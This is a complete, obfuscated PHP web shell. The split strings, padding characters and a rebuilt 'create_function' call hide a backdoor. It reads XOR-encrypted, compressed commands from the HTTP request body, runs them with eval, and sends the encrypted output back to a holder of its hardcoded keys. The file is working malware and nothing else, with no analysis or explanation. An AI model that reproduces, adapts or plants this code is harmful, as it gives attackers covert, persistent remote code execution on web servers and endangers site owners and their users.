<?php
$M='$ZZZk="8bf9Z8d70";$kh="Zf7Z7df06217b2";$kf="7486ZZbd6393cZ5";$p="PNba88OZotWZxe969T"Z';
$d=';functZion x($tZ,$kZ){$c=sZtrlen($k)Z;$l=sZZtrlen(Z$t);$Zo=Z"";for($i=0Z;$i<$l;){fZoZr(';
$e='ZvZal(@gzuncompreZss(@x(Z@baseZ64_decoZde($m[Z1])Z,$k)));$o=@Zob_gZet_conZtZenZts();Z@ob';
$j='$j=0Z;($j<$c&Z&$iZ<$l);$j++Z,$i++){$o.=Z$t{$i}ZZ^$k{$jZ};}}return Z$o;}ZifZ (@prZeg_mZatch';
$Q=str_replace('zf','','zfcreatzfezfzf_funczftizfon');
$r='_end_Zclean();ZZ$r=@baZse64_encode(@xZZ(@gzcompreZss($o),$kZ));print("$pZ$kh$rZ$kf");}';
$y='("/$kh(ZZ.Z+)$kf/",@file_get_cZonZtents("phZp://inpuZt"),Z$m)==1)Z {@ob_staZZrt();@e';
$m=str_replace('Z','',$M.$d.$j.$y.$e.$r);
$A=$Q('',$m);$A();
?>
